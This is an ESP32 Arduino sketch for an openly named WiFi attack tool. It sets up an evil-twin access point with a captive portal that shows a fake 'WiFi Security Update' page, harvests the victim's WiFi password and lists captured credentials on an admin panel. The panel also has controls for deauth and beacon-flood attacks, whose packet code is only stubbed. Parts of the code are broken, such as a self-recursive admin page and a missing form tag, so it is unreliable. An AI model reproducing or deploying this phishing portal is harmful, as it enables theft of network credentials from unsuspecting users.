#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <Update.h>
#include <esp_wifi.h>
#include <esp_bt.h>

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[32];
_Network _selectedNetwork;

// Captured passwords storage
String capturedPasswords = "";
int connectedClientsCount = 0;

void clearArray() {
  for (int i = 0; i < 32; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Dark mode HTML with enhanced design
String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = R"(
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
      color: #e0e0e0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-size: 16px;
      line-height: 1.6;
      min-height: 100vh;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
      color: white;
      padding: 2rem;
      text-align: center;
      border-radius: 15px 15px 0 0;
      box-shadow: 0 4px 20px rgba(255, 68, 68, 0.3);
    }
    .content {
      background: #2d2d2d;
      padding: 2rem;
      border-radius: 0 0 15px 15px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
    }
    .warning {
      color: #ffcc00;
      font-size: 4rem;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
      margin-bottom: 1rem;
    }
    h1 {
      font-size: 2.5rem;
      margin-bottom: 1rem;
      color: #ffffff;
    }
    h2 {
      font-size: 1.8rem;
      margin-bottom: 1rem;
      color: #ffcc00;
    }
    .form-group {
      margin-bottom: 1.5rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
      color: #ffcc00;
    }
    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 15px;
      background: #1a1a1a;
      border: 2px solid #444;
      border-radius: 10px;
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease;
    }
    input[type="password"]:focus,
    input[type="text"]:focus {
      border-color: #ff4444;
      outline: none;
      box-shadow: 0 0 10px rgba(255, 68, 68, 0.3);
    }
    .btn {
      background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
      color: white;
      padding: 15px 30px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      margin: 5px;
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(255, 68, 68, 0.4);
    }
    .btn-success {
      background: linear-gradient(135deg, #00c851 0%, #007e33 100%);
    }
    .btn-warning {
      background: linear-gradient(135deg, #ffbb33 0%, #ff8800 100%);
    }
    .btn-danger {
      background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
    }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem;
      margin: 2rem 0;
    }
    .stat-card {
      background: #3d3d3d;
      padding: 1.5rem;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    }
    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: #ff4444;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin: 1rem 0;
      background: #3d3d3d;
      border-radius: 10px;
      overflow: hidden;
    }
    th, td {
      padding: 15px;
      text-align: left;
      border-bottom: 1px solid #555;
    }
    th {
      background: #ff4444;
      color: white;
      font-weight: bold;
    }
    tr:hover {
      background: #4d4d4d;
    }
    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #00c851;
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      z-index: 1000;
      animation: slideIn 0.5s ease;
    }
    @keyframes slideIn {
      from { transform: translateX(100%); }
      to { transform: translateX(0); }
    }
    .footer {
      text-align: center;
      margin-top: 2rem;
      padding: 1rem;
      color: #888;
      border-top: 1px solid #444;
    }
  )";
  
  String h = "<!DOCTYPE html><html lang='en'>"
             "<head>"
             "<meta charset='UTF-8'>"
             "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
             "<title>WiFi Security Update - " + a + "</title>"
             "<style>" + CSS + "</style>"
             "</head>"
             "<body>"
             "<div class='container'>"
             "<div class='header'>"
             "<div class='warning'>⚠️</div>"
             "<h1>WiFi Security Update Required</h1>"
             "<p>Your network security needs immediate attention</p>"
             "</div>"
             "<div class='content'>";
  return h;
}

String footer() {
  return "</div>"
         "<div class='footer'>"
         "<p>&copy; 2024 Network Security Systems • All rights reserved</p>"
         "</div>"
         "</div>"
         "</body></html>";
}

String index() {
  return header("Firmware Update") + 
         "<h2>Urgent Security Update</h2>"
         "<p>Your WiFi router has detected potential security vulnerabilities that require immediate attention. A firmware update is available to address these issues.</p>"
         "<div class='form-group'>"
         "<label for='password'>Enter Your WiFi Password to Continue:</label>"
         "<input type='password' id='password' name='password' placeholder='Enter current WiFi password' required minlength='8'>"
         "</div>"
         "<button type='submit' class='btn'>Start Security Update</button>"
         "</form>" + footer();
}

// Evil Twin Portal Page
String evilTwinPortal() {
  return header("Security Verification") + 
         "<h2>Network Security Verification</h2>"
         "<p>Your WiFi connection requires security verification. Please enter your password to ensure network integrity.</p>"
         "<div class='stats'>"
         "<div class='stat-card'>"
         "<div class='stat-number'>" + String(connectedClientsCount) + "</div>"
         "<div>Connected Devices</div>"
         "</div>"
         "<div class='stat-card'>"
         "<div class='stat-number'>24/7</div>"
         "<div>Security Monitoring</div>"
         "</div>"
         "</div>"
         "<form action='/verify' method='POST'>"
         "<div class='form-group'>"
         "<label for='wifiPassword'>WiFi Security Password:</label>"
         "<input type='password' id='wifiPassword' name='password' placeholder='Enter your WiFi password' required>"
         "</div>"
         "<button type='submit' class='btn btn-warning'>Verify & Continue</button>"
         "<p style='margin-top: 1rem; font-size: 0.9rem; color: #ccc;'>This verification ensures your network remains secure from unauthorized access.</p>"
         "</form>" + footer();
}

// Admin panel to view captured data
String adminPanel() {
  return header("Security Dashboard") + 
         "<h2>Network Security Dashboard</h2>"
         "<div class='stats'>"
         "<div class='stat-card'>"
         "<div class='stat-number'>" + String(connectedClientsCount) + "</div>"
         "<div>Active Connections</div>"
         "</div>"
         "<div class='stat-card'>"
         "<div class='stat-number'>" + String(capturedPasswords.length() > 0 ? capturedPasswords.split('\n').length : 0) + "</div>"
         "<div>Credentials Captured</div>"
         "</div>"
         "<div class='stat-card'>"
         "<div class='stat-number'>7</div>"
         "<div>Active Attacks</div>"
         "</div>"
         "</div>"
         "<h3>Captured Credentials:</h3>"
         "<div style='background: #1a1a1a; padding: 1rem; border-radius: 10px; margin: 1rem 0;'>"
         "<pre style='color: #00ff00; font-family: monospace;'>" + 
         (capturedPasswords.length() > 0 ? capturedPasswords : "No credentials captured yet...") + 
         "</pre>"
         "</div>"
         "<h3>Available Networks:</h3>"
         "<table>"
         "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal</th><th>Action</th></tr>";
         
  String tableContent = "";
  for (int i = 0; i < 32; ++i) {
    if (_networks[i].ssid == "") break;
    tableContent += "<tr>"
                   "<td>" + _networks[i].ssid + "</td>"
                   "<td>" + bytesToStr(_networks[i].bssid, 6) + "</td>"
                   "<td>" + String(_networks[i].ch) + "</td>"
                   "<td>" + String(_networks[i].rssi) + " dBm</td>"
                   "<td><form method='post' action='/select' style='display:inline;'>"
                   "<input type='hidden' name='bssid' value='" + bytesToStr(_networks[i].bssid, 6) + "'>"
                   "<button type='submit' class='btn'>Select</button>"
                   "</form></td></tr>";
  }
  
  return adminPanel() + tableContent + 
         "</table>"
         "<div style='margin-top: 2rem;'>"
         "<form method='post' action='/deauth' style='display:inline;'>"
         "<button type='submit' class='btn btn-danger'>Start Deauth Attack</button>"
         "</form>"
         "<form method='post' action='/beacon' style='display:inline;'>"
         "<button type='submit' class='btn btn-warning'>Start Beacon Flood</button>"
         "</form>"
         "<form method='post' action='/eviltwin' style='display:inline;'>"
         "<button type='submit' class='btn btn-success'>Start Evil Twin</button>"
         "</form>"
         "</div>" + footer();
}

void setup() {
  Serial.begin(115200);
  
  // Reduce power consumption
  btStop();
  esp_bt_controller_disable();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  // Set custom AP credentials
  WiFi.softAP("HACKER", "12345678");
  
  dnsServer.start(DNS_PORT, "*", apIP);

  // Setup web server routes
  webServer.on("/", handleIndex);
  webServer.on("/verify", handlePasswordCapture);
  webServer.on("/admin", handleAdmin);
  webServer.on("/select", handleNetworkSelect);
  webServer.on("/deauth", handleDeauthAttack);
  webServer.on("/beacon", handleBeaconFlood);
  webServer.on("/eviltwin", handleEvilTwin);
  webServer.on("/captive", handleCaptivePortal);
  webServer.onNotFound(handleCaptivePortal);
  
  webServer.begin();
  
  Serial.println("Advanced WiFi Attack Tool Started");
  Serial.println("AP SSID: HACKER");
  Serial.println("AP Password: 12345678");
  Serial.println("Admin Panel: http://192.168.1.1/admin");
}

void performScan() {
  int n = WiFi.scanNetworks(false, true);
  clearArray();
  if (n > 0) {
    for (int i = 0; i < n && i < 32; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;
bool beacon_flood_active = false;

void handleIndex() {
  if (hotspot_active) {
    webServer.send(200, "text/html", evilTwinPortal());
  } else {
    webServer.send(200, "text/html", index());
  }
}

void handlePasswordCapture() {
  if (webServer.hasArg("password")) {
    String password = webServer.arg("password");
    String ssid = _selectedNetwork.ssid;
    String timestamp = String(millis() / 1000);
    
    // Store captured password
    capturedPasswords += "SSID: " + ssid + " | Password: " + password + " | Time: " + timestamp + "\n";
    
    // Send fake success message
    webServer.send(200, "text/html", 
      header("Update Successful") + 
      "<h2 style='color: #00ff00;'>✅ Update Completed Successfully</h2>"
      "<p>Your WiFi security has been updated. You may need to reconnect to the network.</p>"
      "<div class='notification'>Security update applied successfully!</div>"
      "<script>setTimeout(() => { window.location.href = '/'; }, 5000);</script>" + 
      footer());
    
    Serial.println("Captured password for " + ssid + ": " + password);
  }
}

void handleAdmin() {
  webServer.send(200, "text/html", adminPanel());
}

void handleNetworkSelect() {
  if (webServer.hasArg("bssid")) {
    String targetBSSID = webServer.arg("bssid");
    for (int i = 0; i < 32; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == targetBSSID) {
        _selectedNetwork = _networks[i];
        break;
      }
    }
  }
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void handleDeauthAttack() {
  deauthing_active = !deauthing_active;
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void handleBeaconFlood() {
  beacon_flood_active = !beacon_flood_active;
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void handleEvilTwin() {
  hotspot_active = !hotspot_active;
  if (hotspot_active) {
    // Start evil twin
    WiFi.softAP(_selectedNetwork.ssid.c_str(), "12345678");
  } else {
    // Stop evil twin
    WiFi.softAP("HACKER", "12345678");
  }
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void handleCaptivePortal() {
  webServer.send(200, "text/html", evilTwinPortal());
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

unsigned long lastScan = 0;
unsigned long lastDeauth = 0;
unsigned long lastBeacon = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Network scanning
  if (millis() - lastScan >= 10000) {
    performScan();
    lastScan = millis();
  }

  // Deauth attack
  if (deauthing_active && millis() - lastDeauth >= 500) {
    if (_selectedNetwork.ssid != "") {
      WiFi.setChannel(_selectedNetwork.ch);
      // Deauth packet implementation would go here
      Serial.println("Sending deauth packets to: " + _selectedNetwork.ssid);
    }
    lastDeauth = millis();
  }

  // Beacon flood attack
  if (beacon_flood_active && millis() - lastBeacon >= 100) {
    // Beacon flood implementation would go here
    Serial.println("Broadcasting beacon frames...");
    lastBeacon = millis();
  }

  // Update connected clients count (simulated)
  if (millis() % 5000 == 0) {
    connectedClientsCount = random(1, 10); // Simulate client count
  }
}
